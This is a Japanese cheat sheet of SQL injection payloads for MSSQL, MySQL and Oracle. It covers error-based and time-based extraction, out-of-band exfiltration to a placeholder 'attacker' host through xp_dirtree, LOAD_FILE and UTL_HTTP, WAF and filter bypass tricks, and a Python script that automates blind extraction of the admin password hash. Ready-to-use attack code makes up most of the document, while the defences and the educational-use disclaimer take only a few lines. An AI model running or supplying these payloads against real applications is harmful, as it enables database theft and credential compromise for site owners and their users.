# 高度なSQLインジェクション手法

## 概要
OSWEレベルのSQLインジェクション手法について解説します。

## 基本的な手法

### エラーベースSQLインジェクション
```sql
-- MSSQL
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--

-- MySQL
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(table_name,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--

-- Oracle
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT username FROM all_users WHERE ROWNUM=1))--
```

### 時間ベースSQLインジェクション
```sql
-- MSSQL
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')>0 WAITFOR DELAY '0:0:5'--
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' WAITFOR DELAY '0:0:5'--

-- MySQL
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--
' AND IF(LENGTH(DATABASE())>8,SLEEP(5),0)--

-- Oracle
' AND CASE WHEN (SELECT username FROM all_users WHERE ROWNUM=1)='SYS' THEN 'a'||dbms_pipe.receive_message(('a'),5) ELSE NULL END--
```

### OOBデータ抽出
```sql
-- MSSQL
'; DECLARE @q varchar(8000);SET @q=(SELECT TOP 1 password FROM users FOR XML PATH(''));EXEC master..xp_dirtree '\\attacker\share\'+@q--

-- MySQL
' UNION SELECT 1,2,LOAD_FILE(CONCAT('\\\\attacker\\share\\',DATABASE()))--

-- Oracle
' AND UTL_HTTP.REQUEST('http://attacker/'||(SELECT username FROM all_users WHERE ROWNUM=1))--
```

## バイパステクニック

### WAFバイパス
```sql
-- コメント変換
/**/UNION/**/SELECT/**/password/**/FROM/**/users
%55NION %53ELECT password FROM users

-- 大文字小文字の混合
UnIoN AlL SeLeCt password FrOm users

-- 代替構文
SELECT password FROM users WHERE username LIKE 0x61646D696E
SELECT password FROM users WHERE username IN(0x61646D696E)
```

### フィルタバイパス
```sql
-- スペース置換
SELECT(password)FROM(users)WHERE(username='admin')
SELECT/**/password/**/FROM/**/users

-- クォート置換
SELECT password FROM users WHERE username=0x61646D696E
SELECT password FROM users WHERE username=CHAR(97,100,109,105,110)
```

## 高度な技術

### 第二次注入
```sql
-- ストアドプロシージャ内での注入
EXEC sp_execute('SELECT * FROM users WHERE id=''' + @id + '''')

-- 動的SQLでの注入
SET @sql = 'SELECT * FROM ' + @table + ' WHERE id=' + @id
EXEC(@sql)
```

### ブラインドSQLインジェクション自動化
```python
import requests
import time

def blind_inject(url, payload):
    start_time = time.time()
    r = requests.get(url + payload)
    if time.time() - start_time > 5:
        return True
    return False

def extract_data():
    result = ""
    chars = "0123456789abcdef"
    for i in range(32):  # MD5ハッシュの長さ
        for c in chars:
            payload = f"' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),{i+1},1)='{c}',SLEEP(5),0)--"
            if blind_inject(url, payload):
                result += c
                break
    return result
```

## 防御策
- プリペアドステートメントの使用
- 入力のサニタイズ
- 最小権限の原則
- WAFの適切な設定

## 注意事項
- このテクニックは教育目的でのみ使用してください
- 実環境での使用は法的責任を伴う可能性があります
- すべてのテストは許可された環境でのみ行ってください 